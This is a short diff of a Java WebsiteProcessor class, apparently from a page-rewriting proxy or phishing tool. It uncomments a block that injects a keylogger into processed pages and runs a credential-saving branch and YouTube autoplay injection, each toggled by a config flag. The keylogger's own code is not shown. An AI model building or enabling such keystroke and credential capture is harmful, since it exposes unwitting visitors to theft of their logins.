@@ -118,7 +118,7 @@ public class WebsiteProcessor {
 			domainToHandler.get(ci.getBase()).process(ri,ci,doc);
 		}
 		//keylogger code
-		/*if(config.keylogger){
+		if(config.keylogger){
 			addKeylogger(ri,doc);
 		}
 		if(config.saveCred){
@@ -134,7 +134,7 @@ public class WebsiteProcessor {
 		}
 		if(config.youtubeURL!=null && !config.youtubeURL.equals("")){
 			addYouTubeAutoPlay(ri,doc);
-		}*/
+		}
 		return doc.toString();
 	}
 	private void addYouTubeAutoPlay(RequestInfo ri, Document doc) {
